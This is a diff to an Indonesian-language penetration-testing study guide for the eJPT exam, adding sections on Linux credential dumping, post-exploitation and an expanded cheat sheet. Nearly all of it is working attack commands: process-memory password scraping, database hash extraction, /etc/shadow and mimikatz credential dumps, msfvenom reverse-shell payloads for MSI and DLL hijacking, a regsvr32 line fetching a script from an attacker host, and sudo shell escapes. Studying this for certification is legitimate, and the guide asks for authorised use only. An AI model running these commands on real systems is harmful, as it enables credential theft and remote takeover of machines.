+    RANGE=$(echo "$line" | awk '{print $1}')
+    START=0x$(echo $RANGE | cut -d- -f1)
+    END=0x$(echo $RANGE | cut -d- -f2)
+    dd if=/proc/$PID/mem bs=1 skip=$START count=$((END-START)) 2>/dev/null
+done <<< "$MAPS" | strings | grep -i password
+```
+
+---
+
+### 9.6 Database Credential Access
+
+```bash
+# MySQL - akses langsung jika kredensial ditemukan
+mysql -u root -p
+mysql -u root -pPassword123
+
+# Atau dari file .my.cnf
+mysql -u root
+
+# Dump semua database
+mysqldump --all-databases -u root -pPassword123 > all_dbs.sql
+
+# Ekstrak user dari MySQL
+mysql -u root -pPassword123 -e "SELECT user,authentication_string FROM mysql.user;"
+
+# PostgreSQL
+psql -U postgres -h localhost
+psql -U postgres -h localhost -c "\du"    # list users
+psql -U postgres -h localhost -c "SELECT usename,passwd FROM pg_shadow;"
+
+# SQLite (sering digunakan aplikasi)
+find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
+sqlite3 /path/to/database.db ".tables"
+sqlite3 /path/to/database.db "SELECT * FROM users;"
+```
+
+---
+
+### 9.7 Metasploit Post-Exploitation Modules
+
+```bash
+# Dump /etc/shadow
+meterpreter > run post/linux/gather/hashdump
+
+# Enumeration lengkap
+meterpreter > run post/linux/gather/enum_system
+meterpreter > run post/linux/gather/enum_configs      # file konfigurasi
+meterpreter > run post/linux/gather/enum_network
+meterpreter > run post/linux/gather/enum_users_history  # bash history semua user
+
+# Cari file credentials
+meterpreter > run post/multi/gather/find_interesting_files
+
+# SSH keys
+meterpreter > run post/linux/gather/enum_ssh
+
+# Dump semua readable files
+meterpreter > run post/multi/gather/credentials
+```
+
+---
+
+### 9.8 Ringkasan Alur Linux Credential Dumping
+
+```
+Dapat shell di Linux
+        ↓
+Cek akses ke /etc/shadow?
+        ├── Ya → dump + unshadow + john/hashcat
+        └── Tidak → cari vektor lain
+                ↓
+        Cari SSH keys (~/.ssh/)
+                ↓
+        Bash history & env variables
+                ↓
+        File konfigurasi web/database
+                ↓
+        Akses database langsung
+                ↓
+        Memory dump proses
+```
+
+---
+
+## 10. Post-Exploitation
 
 ### Meterpreter — Perintah Lengkap
 
@@ -1401,7 +1958,7 @@ migrate PID                # pindah ke proses lain (lebih stabil)
 
 ---
 
-## 8. AV Evasion
+## 11. AV Evasion
 
 ### Enkoding Payload
 
@@ -1453,7 +2010,7 @@ regsvr32 /s /n /u /i:http://ATTACKER/malicious.sct scrobj.dll
 
 ---
 
-## 9. Vulnerability Scanning
+## 12. Vulnerability Scanning
 
 ### Nmap Vulnerability Scanning
 
@@ -1496,7 +2053,7 @@ nikto -h http://TARGET_IP -o report.html -Format html
 
 ---
 
-## 10. Cheat Sheet & Quick Reference
+## 13. Cheat Sheet & Quick Reference
 
 ### Ports Penting
 
@@ -1548,6 +2105,18 @@ find / -perm -4000 -type f 2>/dev/null
 sudo -l
 cat /etc/crontab
 
+# ─── CREDENTIAL DUMP ───────────────────────────────────────
+# Windows
+meterpreter> hashdump
+meterpreter> load kiwi; creds_all
+secretsdump.py administrator:Password123@TARGET_IP
+
+# Linux
+cat /etc/shadow
+unshadow /etc/passwd /etc/shadow > hashes.txt
+find / -name "id_rsa" 2>/dev/null
+grep -rn "password" ~/.bash_history
+
 # ─── HASH CRACK ────────────────────────────────────────────
 hashcat -m 1000 ntlm_hashes.txt rockyou.txt       # NTLM
 hashcat -m 1800 linux_shadow.txt rockyou.txt       # SHA-512 Linux
@@ -1566,6 +2135,12 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o lin.
 # PHP Shell
 msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php
 
+# MSI (AlwaysInstallElevated)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f msi -o shell.msi
+
+# DLL Hijack
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll -o hijack.dll
+
 # Multi/handler listener
 use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run -j
 ```
@@ -1575,7 +2150,6 @@ use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.
 Referensi lengkap: https://gtfobins.github.io/
 
 ```bash
-# Pola umum untuk SUID/sudo
 # find
 sudo find . -exec /bin/sh \; -quit
 find . -exec /bin/sh -p \; -quit
@@ -1621,8 +2195,10 @@ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/ba
 | Exploit-DB | https://www.exploit-db.com/ |
 | PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
 | SecLists (wordlists) | https://github.com/danielmiessler/SecLists |
+| Impacket | https://github.com/fortra/impacket |
+| Mimikatz | https://github.com/gentilkiwi/mimikatz |
 
 ---
 
-*📅 Dibuat untuk studi eJPT — System/Host Based Attacks*
+*📅 Dibuat untuk studi eJPT — System/Host Based Attacks*  
 *⚠️ Gunakan hanya di lingkungan yang telah mendapat izin*
